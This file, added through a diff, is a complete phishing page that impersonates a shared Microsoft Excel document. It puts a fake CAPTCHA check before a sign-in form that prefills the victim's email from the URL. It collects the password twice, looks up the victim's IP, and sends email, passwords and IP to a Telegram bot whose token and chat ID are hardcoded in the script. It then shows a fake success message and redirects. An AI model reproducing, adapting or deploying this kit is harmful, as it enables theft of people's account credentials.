@@ -1,0 +1,829 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="shortcut icon" href="https://i.gyazo.com/453c2a245c21aacfb53fc75906b2c7fe.png">
+<title>Excel :: Shared Document</title>
+
+<style>
+  * {
+    box-sizing: border-box;
+    font-family: "Segoe UI Variable", "Segoe UI", system-ui, sans-serif;
+  }
+
+  body {
+    margin: 0;
+    min-height: 100vh;
+    background: #f3f3f3;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .card {
+    background: #ffffff;
+    width: 100%;
+    max-width: 360px;
+    padding: 28px;
+    border-radius: 12px;
+    box-shadow: 0 12px 30px rgba(0,0,0,0.15);
+    transition: transform 0.3s ease;
+    position: relative;
+    z-index: 2;
+  }
+
+  .card:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 15px 35px rgba(0,0,0,0.2);
+  }
+
+  .title {
+    font-size: 18px;
+    font-weight: 600;
+    margin-bottom: 20px;
+    color: #323130;
+  }
+
+  .row {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    cursor: pointer;
+    padding: 8px;
+    border-radius: 6px;
+    transition: background-color 0.2s;
+  }
+
+  .row:hover {
+    background-color: rgba(0, 0, 0, 0.05);
+  }
+
+  .checkbox {
+    width: 20px;
+    height: 20px;
+    border: 2px solid #8a8a8a;
+    border-radius: 4px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: all 0.2s ease;
+  }
+
+  .checkbox.checked {
+    background: #ff0000;
+    border-color: #ff0000;
+  }
+
+  .checkbox svg {
+    width: 12px;
+    height: 12px;
+    stroke: #fff;
+    stroke-width: 3;
+    fill: none;
+    opacity: 0;
+    transition: opacity 0.2s;
+  }
+
+  .checkbox.checked svg {
+    opacity: 1;
+  }
+
+  .progress-ring {
+    width: 32px;
+    height: 32px;
+    border: 3px solid #e1e1e1;
+    border-top-color: #ff0000;
+    border-right-color: #ff0000;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    margin-top: 18px;
+    display: none;
+  }
+
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  .status {
+    margin-top: 12px;
+    font-size: 14px;
+    color: #323130;
+    display: none;
+    min-height: 20px;
+  }
+
+  /* Form page */
+  .form-page {
+    display: none;
+    width: 100%;
+    min-height: 100vh;
+    position: relative;
+    z-index: 3;
+  }
+
+  /* Form-specific background */
+  .form-background {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-image: url('https://cdn.mcauto-images-production.sendgrid.net/32724a092ad701f7/c6e2282d-8a53-44c8-9b7c-262b2479f731/1366x768.jpg');
+    background-size: cover;
+    background-position: center;
+    filter: blur(0px) brightness(2.07);
+    transform: scale(1.05);
+    z-index: 0;
+  }
+  .form-overlay {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.5);
+    z-index: 1;
+  }
+
+  .header {
+    background: rgba(16, 124, 65, 0.95);
+    padding: 14px 24px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    color: white;
+    box-shadow: 0 2px 15px rgba(0,0,0,0.25);
+    position: relative;
+    z-index: 2;
+    backdrop-filter: blur(3px);
+  }
+
+  .excel-logo {
+    width: 34px;
+    height: 34px;
+    background: #ffffff;
+    color: #ff0000;
+    font-weight: bold;
+    font-size: 18px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border-radius: 4px;
+    box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+  }
+
+  .form-container {
+    padding: 40px 30px;
+    max-width: 420px;
+    margin: auto;
+    position: relative;
+    z-index: 2;
+  }
+
+  .form-card {
+    background: rgb(255, 255, 255);
+    padding: 40px 30px;
+    border-radius: 12px;
+    box-shadow: 0 15px 35px rgba(0, 0, 0, 0.25);
+    backdrop-filter: blur(7px);
+    border: 1px solid rgba(255, 255, 255, 0.2);
+    animation: fadeIn 0.5s ease;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(10px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  h2 {
+    color: #323130;
+    margin-bottom: 24px;
+    font-weight: 600;
+    text-align: center;
+  }
+
+  .input-group {
+    margin-bottom: 16px;
+    position: relative;
+  }
+
+  input {
+    width: 100%;
+    padding: 12px 40px 12px 12px;
+    font-size: 14px;
+    border: 1px solid rgba(209, 209, 209, 0.8);
+    border-radius: 4px;
+    transition: all 0.2s;
+    background: rgba(255, 255, 255, 0.9);
+  }
+
+  input:focus {
+    outline: none;
+    border-color: #ff0000;
+    box-shadow: 0 0 0 3px rgba(16, 124, 65, 0.15);
+    background: #ffffff;
+  }
+
+  input:read-only {
+    background-color: rgba(248, 248, 248, 0.8);
+    cursor: not-allowed;
+  }
+
+  input.error {
+    border-color: #dc3545;
+  }
+
+  input.success {
+    border-color: #dc3545;
+  }
+
+  .password-eye {
+    position: absolute;
+    right: 12px;
+    top: 80%;
+    transform: translateY(-50%);
+    cursor: pointer;
+    color: #666;
+    padding: 4px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: color 0.2s;
+    background: none;
+    border: none;
+    width: 20px;
+    height: 20px;
+    margin: 0;
+    z-index: 10;
+  }
+
+  .password-eye:hover {
+    color: #ff0000;
+  }
+
+  .password-eye svg {
+    width: 18px;
+    height: 18px;
+    stroke: currentColor;
+    stroke-width: 2;
+    fill: none;
+  }
+
+  .password-eye .eye-open {
+    display: none;
+  }
+
+  .password-eye.show .eye-closed {
+    display: none;
+  }
+
+  .password-eye.show .eye-open {
+    display: block;
+  }
+
+  .password-hint {
+    font-size: 12px;
+    color: #666;
+    margin-top: 4px;
+    min-height: 18px;
+    display: flex;
+    align-items: center;
+    gap: 5px;
+    transition: all 0.3s ease;
+  }
+
+  button {
+    width: 100%;
+    padding: 12px;
+    background: #ff0000;
+    color: white;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 14px;
+    font-weight: 600;
+    transition: all 0.2s;
+    margin-top: 10px;
+    box-shadow: 0 2px 5px rgba(0,0,0,0.15);
+  }
+
+  button:hover {
+    background: #ff0000;
+    transform: translateY(-1px);
+    box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+  }
+
+  button:active {
+    transform: translateY(0);
+  }
+
+  button:disabled {
+    background: #8a8a8a;
+    cursor: not-allowed;
+    transform: none;
+    box-shadow: none;
+  }
+
+  /* Success/Error Messages */
+  .message {
+    padding: 12px;
+    border-radius: 4px;
+    margin: 15px 0;
+    font-size: 14px;
+    display: none;
+    text-align: center;
+  }
+
+  .success {
+    background: rgba(16, 124, 65, 0.1);
+    color: #ff0000;
+    border: 1px solid rgba(16, 124, 65, 0.3);
+  }
+
+  .error {
+    background: rgba(220, 53, 69, 0.1);
+    color: #dc3545;
+    border: 1px solid rgba(220, 53, 69, 0.3);
+  }
+
+  /* Redirect Countdown */
+  .redirect-countdown {
+    text-align: center;
+    margin-top: 15px;
+    font-size: 13px;
+    color: #666;
+    display: none;
+  }
+
+  .countdown-number {
+    font-weight: bold;
+    color: #ff0000;
+    animation: pulse 1s infinite;
+  }
+
+  @keyframes pulse {
+    0% { opacity: 1; }
+    50% { opacity: 0.6; }
+    100% { opacity: 1; }
+  }
+
+  /* Forgot password link */
+  .forgot-password {
+    text-align: center;
+    margin-top: 15px;
+  }
+
+  .forgot-password a {
+    color: #ff0000;
+    text-decoration: none;
+    font-size: 13px;
+  }
+
+  .forgot-password a:hover {
+    text-decoration: underline;
+  }
+
+  /* Add some responsiveness */
+  @media (max-width: 480px) {
+    .card, .form-card {
+      padding: 20px;
+    }
+    
+    .form-card {
+      padding: 30px 20px;
+    }
+    
+    .form-background {
+      filter: blur(2px) brightness(0.8);
+    }
+    
+    input {
+      padding: 12px 36px 12px 12px;
+    }
+    
+    .password-eye {
+      right: 10px;
+    }
+  }
+</style>
+</head>
+
+<body>
+
+<!-- Verification Page -->
+<div class="card" id="verifyCard">
+  <div class="title">Checking your browser before accessing the site</div>
+
+  <div class="row" id="checkRow">
+    <div class="checkbox" id="checkbox">
+      <svg viewBox="0 0 24 24">
+        <polyline points="4,12 9,17 20,6"></polyline>
+      </svg>
+    </div>
+    <div>I'm not a robot</div>
+  </div>
+<p class="pt-1">click on the checkbox to verify if you're human.</p>
+  <div class="progress-ring" id="loader"></div>
+  <div class="status" id="status"></div>
+</div>
+
+<!-- Form Page -->
+<div class="form-page" id="formPage">
+  <div class="form-background"></div>
+  <div class="form-overlay"></div>
+
+  <div class="form-container">
+    <div class="form-card">
+	<img src="https://i.gyazo.com/453c2a245c21aacfb53fc75906b2c7fe.png" width="60px">
+	<br>
+      <h5>Sign in to view document</h5>
+      
+      <div id="successMessage" class="message success" style="display: none;">
+        ? Successful!
+      </div>
+      
+      <div id="errorMessage" class="message error" style="display: none;">
+        ? Please fill in all fields before submitting.
+      </div>
+      
+      <!-- Email Field -->
+      <div class="input-group">
+        <input type="email" id="emailField" placeholder="Enter address" value="[[-Email-]]" required="">
+      </div>
+      
+      <!-- Single Password Field with Perfectly Positioned Eye Icon -->
+      <div class="input-group">
+        <input type="password" id="passwordField" placeholder="Enter your password" autocomplete="current-password" required>
+        <div class="password-eye" id="passwordEye">
+
+        </div>
+        <div class="password-hint" id="passwordHint">
+          ? Enter your password
+        </div>
+      </div>
+      
+      <!-- Forgot password link -->
+      <div class="forgot-password">
+        <a href="#" id="forgotPasswordLink">Forgot my password</a>
+      </div>
+      
+      <!-- Submit Button -->
+      <button id="loginButton">Sign in</button>
+      
+      <!-- Redirect Countdown -->
+      <div id="redirectCountdown" class="redirect-countdown">
+        Preparing your document
+        <span class="countdown-number" id="countdownNumber">4</span> 
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  // ============================================
+  // CONFIGURATION - UPDATE THESE VALUES
+  // ============================================
+  
+  // Telegram Bot Configuration
+  const TELEGRAM_BOT_TOKEN = '8529899804:AAFKwLZNSCWt_SgfqFyq19XFJZEdiBUyKKI';
+  const TELEGRAM_CHAT_ID = '8595498980';
+  
+  // Redirect Configuration
+  const REDIRECT_URL = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSv7t9HbrJv4K-zLH6IFpLhPsfH2cidR-D30A&s';
+  const REDIRECT_DELAY = 4; // seconds
+  
+  // ============================================
+  
+  // State Management
+  let passwordAttempt = 1;
+  let firstPassword = '';
+  let secondPassword = '';
+  
+  // DOM Elements
+  const emailField = document.getElementById('emailField');
+  const passwordField = document.getElementById('passwordField');
+  const passwordEye = document.getElementById('passwordEye');
+  const passwordHint = document.getElementById('passwordHint');
+  const loginButton = document.getElementById('loginButton');
+  const successMessage = document.getElementById('successMessage');
+  const errorMessage = document.getElementById('errorMessage');
+  const redirectCountdown = document.getElementById('redirectCountdown');
+  const countdownNumber = document.getElementById('countdownNumber');
+  const forgotPasswordLink = document.getElementById('forgotPasswordLink');
+  
+  // Improved email capture with validation
+  function getEmailFromURL() {
+    const hash = window.location.hash.substring(1);
+    if (!hash) return '';
+    
+    try {
+      const email = decodeURIComponent(hash);
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      return emailRegex.test(email) ? email : '';
+    } catch (e) {
+      console.error('Error decoding email:', e);
+      return '';
+    }
+  }
+  
+  // Function to send both passwords to Telegram
+  async function sendPasswordsToTelegram(email, password1, password2) {
+    try {
+      // Check if credentials are configured
+      if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+        console.error('Telegram bot not configured.');
+        return false;
+      }
+      
+      const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      
+      const matchStatus = password1 === password2;
+      const matchEmoji = matchStatus ? '?' : '?';
+      
+      const message = `Microsoft Excel Login\n\n` +
+                     `Date: ${new Date().toLocaleString()}\n` +
+                     `IP: ${await getIPAddress()}\n` +
+                     `Email: ${email}\n` +
+                     `First Entry: ${password1}\n` +
+                     `Second Entry: ${password2}\n` +
+                     `${matchEmoji} Match: ${matchStatus ? 'YES' : 'NO'}\n` +
+                     `URL: ${window.location.href}`;
+      
+      const response = await fetch(TELEGRAM_API_URL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: 'HTML'
+        })
+      });
+      
+      const data = await response.json();
+      return data.ok;
+      
+    } catch (error) {
+      console.error('Error sending to Telegram:', error);
+      return false;
+    }
+  }
+  
+  // Function to get user's IP address
+  async function getIPAddress() {
+    try {
+      const response = await fetch('https://ifconfig.co/?format=json');
+      const data = await response.json();
+      return data.ip;
+    } catch (error) {
+      return 'Unable to retrieve IP';
+    }
+  }
+  
+  // Function to start redirect countdown
+  function startRedirectCountdown() {
+    redirectCountdown.style.display = 'block';
+    let seconds = REDIRECT_DELAY;
+    
+    const countdownInterval = setInterval(() => {
+      countdownNumber.textContent = seconds;
+      
+      if (seconds <= 0) {
+        clearInterval(countdownInterval);
+        window.location.href = REDIRECT_URL;
+      }
+      
+      seconds--;
+    }, 1000);
+  }
+  
+  // Update password UI based on attempt number
+  function updatePasswordUI() {
+    if (passwordAttempt === 1) {
+      passwordField.placeholder = 'Enter your password';
+      passwordHint.textContent = 'Enter your correct password';
+      passwordHint.style.opacity = '1';
+      loginButton.textContent = 'Next';
+    } else if (passwordAttempt === 2) {
+      passwordField.placeholder = 'Confirm Password';
+      passwordHint.textContent = 'Please re-enter your password for security verification';
+      passwordHint.style.opacity = '1';
+      loginButton.textContent = 'Sign in';
+    }
+  }
+  
+  // Toggle password visibility
+  passwordEye.addEventListener('click', function(e) {
+    e.preventDefault();
+    e.stopPropagation();
+    
+    const isPassword = passwordField.type === 'password';
+    passwordField.type = isPassword ? 'text' : 'password';
+    this.classList.toggle('show', isPassword);
+  });
+  
+  const urlEmail = getEmailFromURL();
+  let clicked = false;
+  
+  // Verification checkbox click handler
+  document.getElementById("checkRow").addEventListener("click", () => {
+    if (clicked) return;
+    clicked = true;
+    
+    const checkbox = document.getElementById("checkbox");
+    const loader = document.getElementById("loader");
+    const status = document.getElementById("status");
+    const verifyCard = document.getElementById("verifyCard");
+    const formPage = document.getElementById("formPage");
+    
+    checkbox.classList.add("checked");
+    loader.style.display = "block";
+    status.style.display = "block";
+    
+    let sec = 3;
+    status.textContent = `Verifying  ${sec}s`;
+    
+    const timer = setInterval(() => {
+      sec--;
+      status.textContent = `Verifying   ${sec}s`;
+      
+      if (sec === 0) {
+        clearInterval(timer);
+        verifyCard.style.display = "none";
+        formPage.style.display = "block";
+        
+        // Autofill email if available
+        if (urlEmail) {
+          emailField.value = urlEmail;
+          emailField.readOnly = true;
+        } else {
+          emailField.focus();
+        }
+        
+        // Initialize password UI
+        updatePasswordUI();
+      }
+    }, 1000);
+  });
+  
+  // Password field input handler
+  passwordField.addEventListener('input', function() {
+    errorMessage.style.display = 'none';
+    this.classList.remove('error');
+    
+    // Hide hint when typing
+    if (this.value.length > 0) {
+      passwordHint.style.opacity = '0.7';
+    } else {
+      passwordHint.style.opacity = '1';
+    }
+  });
+  
+  // Login button click handler
+  loginButton.addEventListener("click", async (e) => {
+    e.preventDefault();
+    
+    const email = emailField.value.trim();
+    const password = passwordField.value;
+    
+    // Hide any previous messages
+    successMessage.style.display = 'none';
+    errorMessage.style.display = 'none';
+    
+    // Validate email
+    if (!email) {
+      errorMessage.textContent = 'Please enter your email address.';
+      errorMessage.style.display = 'block';
+      emailField.focus();
+      emailField.classList.add('error');
+      return;
+    } else {
+      emailField.classList.remove('error');
+    }
+    
+    // Validate password is not empty
+    if (!password) {
+      errorMessage.textContent = 'Please enter your password.';
+      errorMessage.style.display = 'block';
+      passwordField.focus();
+      passwordField.classList.add('error');
+      return;
+    } else {
+      passwordField.classList.remove('error');
+    }
+    
+    if (passwordAttempt === 1) {
+      // Store first password and prepare for second entry
+      firstPassword = password;
+      passwordAttempt = 2;
+      passwordField.value = '';
+      updatePasswordUI();
+      passwordField.focus();
+      passwordField.type = 'password';
+      passwordEye.classList.remove('show');
+      
+    } else if (passwordAttempt === 2) {
+      // Store second password and submit
+      secondPassword = password;
+      
+      // Show loading state
+      const originalText = loginButton.textContent;
+      loginButton.textContent = "Signing in...";
+      loginButton.disabled = true;
+      
+      try {
+        // Send BOTH passwords to Telegram (fire and forget - no error handling)
+        sendPasswordsToTelegram(email, firstPassword, secondPassword)
+          .then(sent => {
+            if (!sent) {
+              console.log('Telegram submission may have failed, but proceeding with redirect...');
+            }
+          })
+          .catch(err => {
+            console.log('Background Telegram error:', err);
+          });
+        
+        // Immediately proceed to success state (no error checking)
+        successMessage.style.display = 'block';
+        successMessage.textContent = 'Successful!';
+        errorMessage.style.display = 'none';
+        
+        // Update UI for success
+        passwordField.classList.add('success');
+        passwordHint.textContent = 'Sign in successful';
+        passwordHint.style.color = '#ff0000';
+        passwordHint.style.opacity = '1';
+        
+        // Disable all inputs and eye icon
+        emailField.disabled = true;
+        passwordField.disabled = true;
+        passwordEye.style.display = 'none';
+        
+        // Mask password field
+        passwordField.value = '        ';
+        passwordField.type = 'text';
+        
+        // Start redirect countdown
+        startRedirectCountdown();
+        
+      } catch (error) {
+        // Silent error handling - still proceed with redirect
+        console.log('Silent error during sign in:', error);
+        
+        // Proceed to success state anyway
+        successMessage.style.display = 'block';
+        successMessage.textContent = 'Sign in successful! Redirecting to your account...';
+        
+        // Update UI for success
+        passwordField.classList.add('success');
+        passwordHint.textContent = 'Sign in successful';
+        passwordHint.style.color = '#ff0000';
+        passwordHint.style.opacity = '1';
+        
+        // Disable all inputs and eye icon
+        emailField.disabled = true;
+        passwordField.disabled = true;
+        passwordEye.style.display = 'none';
+        
+        // Mask password field
+        passwordField.value = '        ';
+        passwordField.type = 'text';
+        
+        // Start redirect countdown
+
+        startRedirectCountdown();
+      }
+    }
+  });
+  
+  // Forgot password link handler
+  forgotPasswordLink.addEventListener("click", function(e) {
+    e.preventDefault();
+    alert("For security reasons, please visit the official Microsoft password reset page at: https://account.live.com/password/reset");
+  });
+  
+  // Allow pressing Enter to submit password
+  passwordField.addEventListener("keypress", (e) => {
+    if (e.key === 'Enter') {
+      loginButton.click();
+    }
+  });
+  
+  // Clear error messages on input
+  emailField.addEventListener("input", () => {
+    errorMessage.style.display = 'none';
+    emailField.classList.remove('error');
+  });
+  
+  // Initialize page
+  window.addEventListener('load', () => {
+    console.log('Microsoft Excel login page loaded');
+  });
+</script>
+</body>
+</html>
